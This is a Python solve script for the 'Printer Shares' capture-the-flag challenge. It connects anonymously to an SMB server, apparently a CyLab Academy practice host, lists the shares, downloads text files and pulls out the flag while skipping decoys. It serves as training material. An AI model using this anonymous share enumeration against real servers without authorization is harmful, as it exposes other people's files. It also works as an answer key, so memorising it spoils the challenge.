#!/usr/bin/env python3
"""
Solve script for Printer Shares (#759)
Category: General Skills
"""
import io
import re
import sys
from pathlib import Path
from smb.SMBConnection import SMBConnection


def get_connection_info():
    cfg_path = Path(__file__).parent / "connection.cfg"
    host = ""
    port = 0

    if cfg_path.exists():
        with open(cfg_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line.startswith("HOST="):
                    host = line.split("=", 1)[1].strip()
                elif line.startswith("PORT="):
                    val = line.split("=", 1)[1].strip()
                    if val.isdigit():
                        port = int(val)

    if not host or port == 0:
        info_path = Path(__file__).parent / "info.json"
        if info_path.exists():
            import json
            with open(info_path, "r", encoding="utf-8") as f:
                info = json.load(f)
                desc = info.get("description", "")
                m = re.search(r"xebec\.cylabacademy\.net\s+(\d+)", desc)
                if m:
                    host = "xebec.cylabacademy.net"
                    port = int(m.group(1))

    return host, port


def solve():
    print("[*] Solving Printer Shares...", flush=True)
    host, port = get_connection_info()
    print(f"[*] Target: {host}:{port}", flush=True)

    if not host or port == 0:
        raise ValueError("Could not find valid HOST or PORT in connection.cfg or info.json")

    conn = SMBConnection("", "", "client", "server", use_ntlm_v2=True, is_direct_tcp=True)
    if not conn.connect(host, port, timeout=15):
        raise ConnectionError(f"Failed to connect to SMB server at {host}:{port}")

    print("[+] Successfully connected to SMB server", flush=True)

    shares = conn.listShares(timeout=10)
    target_share = None
    for share in shares:
        print(f"[*] Found share: {share.name} ({share.comments})", flush=True)
        if share.name.lower() in ["shares", "printer", "printers", "public"]:
            target_share = share.name
        elif not target_share and share.name not in ["IPC$"]:
            target_share = share.name

    if not target_share:
        target_share = "shares"

    print(f"[*] Browsing share: {target_share}", flush=True)
    files = conn.listPath(target_share, "/")
    flag = ""

    for f in files:
        print(f"  - {f.filename} (isdir={f.isDirectory}, size={f.file_size})", flush=True)
        if not f.isDirectory and ("flag" in f.filename.lower() or f.filename.endswith(".txt")):
            bio = io.BytesIO()
            conn.retrieveFile(target_share, f"/{f.filename}", bio)
            content = bio.getvalue().decode("utf-8", errors="replace").strip()
            print(f"[*] Content of {f.filename}: {content}", flush=True)

            matches = re.findall(r"(?:academy|picoCTF)\{[^}]+\}", content)
            for m in matches:
                # Reject decoys
                if any(bad in m.lower() for bad in ["decoy", "fake", "honeypot", "dummy", "not_the_flag"]):
                    continue
                flag = m
                break

    conn.close()

    if flag:
        print(f"[+] Flag found: {flag}", flush=True)
        flag_file = Path(__file__).parent / "flag.txt"
        with open(flag_file, "w", encoding="utf-8") as f:
            f.write(flag + "\n")
        print(f"[+] Flag written to {flag_file}", flush=True)
    else:
        print("[-] Flag not found!", flush=True)

    return flag


if __name__ == "__main__":
    solve()
